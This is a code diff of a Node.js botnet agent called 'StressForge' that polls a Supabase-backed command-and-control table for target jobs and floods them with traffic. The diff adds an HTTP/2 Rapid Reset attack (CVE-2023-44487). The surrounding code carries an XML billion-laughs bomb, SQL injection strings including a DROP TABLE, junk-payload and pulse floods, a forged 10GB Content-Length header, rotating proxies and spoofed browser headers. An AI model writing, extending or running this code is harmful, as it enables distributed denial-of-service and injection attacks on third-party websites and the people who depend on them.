@@ -1,8 +1,7 @@
 /**
- * STRESSFORGE BOTNET AGENT V10.0 (OMNI-STRIKE)
- * - Fix: Smart Feature Balancing (Prevents Self-Choking)
- * - Fix: Ghost Proxy forced to HTTP/1.1 for reliability
- * - Fix: Dynamic Payload Sizing (GoldenEye adjusts for Pulse Mode)
+ * STRESSFORGE BOTNET AGENT V11.0 (GOD MODE)
+ * - Feature: HTTP/2 RAPID RESET (CVE-2023-44487)
+ * - Fix: Smart Feature Balancing (Omni-Strike)
  * - Safety: Memory Governor (Max 2500 threads)
  */
 const https = require('https');
@@ -29,13 +28,13 @@ const USER_AGENTS = [
 const REFERERS = ["https://google.com", "https://bing.com", "https://twitter.com", "https://facebook.com"];
 // Pre-calculate buffers to save CPU
 const JUNK_DATA_LARGE = Buffer.alloc(1024 * 50, 'x'); // 50KB for Standard GoldenEye
-const JUNK_DATA_SMALL = Buffer.alloc(1024 * 1, 'x');  // 1KB for Pulse Mode (Speed optimized)
+const JUNK_DATA_SMALL = Buffer.alloc(1024 * 1, 'x');  // 1KB for Pulse Mode
 const XML_BOMB = '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"><!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"><!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"><!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"><!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">]><lolz>&lol9;</lolz>';
 const SQL_PAYLOADS = ["' OR 1=1 --", "UNION SELECT 1, SLEEP(10) --", "'; DROP TABLE users; --", "admin' --"];
 
 // --- KEEPALIVE SERVER ---
 const PORT = process.env.PORT || 3000;
-http.createServer((req, res) => { res.writeHead(200); res.end('StressForge Agent V10.0 ACTIVE'); })
+http.createServer((req, res) => { res.writeHead(200); res.end('StressForge Agent V11.0 ACTIVE'); })
     .listen(PORT, () => console.log(`[SYSTEM] Agent listening on port ${PORT}`));
 
 // --- HELPER: NATIVE SUPABASE ---
@@ -73,7 +72,7 @@ const supabaseRequest = (method, pathStr, body = null) => {
     });
 };
 
-console.log('\x1b[35m[AGENT] Initialized V10.0 (Omni-Strike). Polling C2...\x1b[0m');
+console.log('\x1b[35m[AGENT] Initialized V11.0 (God Mode). Polling C2...\x1b[0m');
 
 let activeJob = null;
 let activeLoop = null;
@@ -98,10 +97,10 @@ const startAttack = (job) => {
     let targetUrl;
     try { targetUrl = new URL(job.target); } catch(e) { return; }
     
-    // CONFLICT RESOLUTION: Disable HTTP/2 if Ghost Proxy is active (Simpler tunneling)
-    const useH2 = job.use_http2 && targetUrl.protocol === 'https:' && !job.use_ghost_proxy;
+    // HTTP/2 & GOD MODE Logic
+    const useH2 = (job.use_http2 || job.use_god_mode) && targetUrl.protocol === 'https:' && !job.use_ghost_proxy;
 
-    // HTTP/2 SESSION (Turbo)
+    // HTTP/2 SESSION (Turbo/God)
     let h2Session = null;
     if (useH2) {
         try {
@@ -118,33 +117,42 @@ const startAttack = (job) => {
     const performRequest = () => {
         if (!running) return;
         
-        // --- 1. HEADER MIMICRY ---
+        // --- GOD MODE (RAPID RESET) ---
+        if (job.use_god_mode && h2Session && !h2Session.destroyed) {
+            // FIRE AND FORGET - Cancel immediately
+            const req = h2Session.request({ ':path': targetUrl.pathname + targetUrl.search, ':method': job.method || 'GET', ...baseHeaders });
+            // RAPID RESET (CVE-2023-44487)
+            req.close(http2.constants.NGHTTP2_CANCEL);
+            totalRequests++;
+            // Since we cancel, we assume 'success' in delivery term, latency is effectively 0
+            jobSuccess++; 
+            if (running) setImmediate(performRequest);
+            return;
+        }
+
+        // --- STANDARD / TURBO LOGIC ---
         const currentHeaders = { ...baseHeaders };
         currentHeaders['Accept-Encoding'] = 'gzip, deflate, br';
         currentHeaders['Sec-Ch-Ua'] = '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"';
         currentHeaders['Upgrade-Insecure-Requests'] = '1';
 
-        // --- 2. PAYLOAD OPTIMIZATION (Prevent Choking) ---
         let payload = job.body;
         if (job.use_xml_bomb) {
             payload = XML_BOMB;
             currentHeaders['Content-Type'] = 'application/xml';
         } else if (job.use_goldeneye) {
             currentHeaders['X-Heavy-Load'] = 'true';
-            // OPTIMIZATION: Use smaller payload if Pulse Mode is active to prevent bandwidth choking
             payload = job.use_pulse ? JUNK_DATA_SMALL : JUNK_DATA_LARGE;
         } else if (job.use_big_bang) {
              currentHeaders['Content-Length'] = '10737418240'; 
         }
 
-        // --- 3. SQL FLOOD ---
         let currentUrl = targetUrl.href;
         if (job.use_sql_flood) {
             const separator = currentUrl.includes('?') ? '&' : '?';
             const sql = SQL_PAYLOADS[Math.floor(Math.random() * SQL_PAYLOADS.length)];
             currentUrl += `${separator}q=${encodeURIComponent(sql)}`;
         }
-        
         if (job.use_chaos) {
             const separator = currentUrl.includes('?') ? '&' : '?';
             currentUrl += `${separator}_vortex=${Math.random().toString(36).substring(2)}`;
@@ -152,7 +160,6 @@ const startAttack = (job) => {
             currentHeaders['Referer'] = REFERERS[Math.floor(Math.random() * REFERERS.length)];
         }
 
-        // --- 4. PROXY SELECTION (GHOST MODE) ---
         let proxyOptions = null;
         if (job.use_ghost_proxy) {
             const proxy = PROXY_LIST[Math.floor(Math.random() * PROXY_LIST.length)];
@@ -163,13 +170,10 @@ const startAttack = (job) => {
         const vortexUrlObj = new URL(currentUrl);
         const start = Date.now();
 
-        // --- 5. REQUEST EXECUTION ---
         const handleResponse = (res) => {
             const lat = Date.now() - start;
             jobLatencySum += lat; jobReqsForLatency++; jobMaxLatency = Math.max(jobMaxLatency, lat);
-            // Treat 3xx redirects as success in attack mode
             if (res.statusCode >= 200 && res.statusCode < 400) jobSuccess++; else jobFailed++;
-            // Drain data to free memory
             res.on('data', () => {}); 
             res.on('end', () => {});
             totalRequests++;
@@ -179,7 +183,6 @@ const startAttack = (job) => {
         const handleError = () => {
              jobFailed++; totalRequests++; 
              if (job.use_infinity && running) {
-                 // Retry 3x immediately
                  setImmediate(performRequest); setImmediate(performRequest); setImmediate(performRequest);
              } else if (running && !job.use_pulse) {
                  setImmediate(performRequest); 
@@ -235,10 +238,8 @@ const startAttack = (job) => {
     };
 
     if (job.use_pulse) {
-        // Pulse Mode: Fire bursts every 100ms
         const pulseLoop = setInterval(() => { 
             if (!running) return clearInterval(pulseLoop); 
-            // Reduce burst size to 100 if Heavy features are on to prevent choke
             const burstSize = (job.use_goldeneye || job.use_xml_bomb) ? 100 : 500;
             for(let i=0; i<burstSize; i++) performRequest(); 
         }, 100);
@@ -250,12 +251,9 @@ const startAttack = (job) => {
         const elapsed = (Date.now() - startTime) / 1000;
         const rps = Math.floor(totalRequests / elapsed) || 0;
         const avgLat = jobReqsForLatency > 0 ? Math.round(jobLatencySum / jobReqsForLatency) : 0;
-        
-        // Memory Protection
         const used = process.memoryUsage().heapUsed / 1024 / 1024;
         if (used > 400 && global.gc) global.gc();
 
-        // SELF-HEALING DB WRITE (Legacy Fallback)
         const statsPayload = { 
              current_rps: rps,
              total_success: jobSuccess,
@@ -269,7 +267,6 @@ const startAttack = (job) => {
         } catch(e) { 
             console.log(`[DB ERROR] ${e.message}`);
             try {
-                // Fallback: If DB schema is old, send minimal stats
                 await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { current_rps: rps });
             } catch(e2) { }
         }
@@ -288,11 +285,9 @@ const startAttack = (job) => {
 setInterval(async () => {
     if (activeJob) return;
     try {
-        // True Swarm: Check for PENDING or RUNNING jobs
         const jobs = await supabaseRequest('GET', '/jobs?status=in.(PENDING,RUNNING)&limit=1');
         if (jobs && jobs.length > 0) {
             const job = jobs[0];
-            // Only update status to RUNNING if it's PENDING
             if (job.status === 'PENDING') {
                 await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { status: 'RUNNING' });
             }
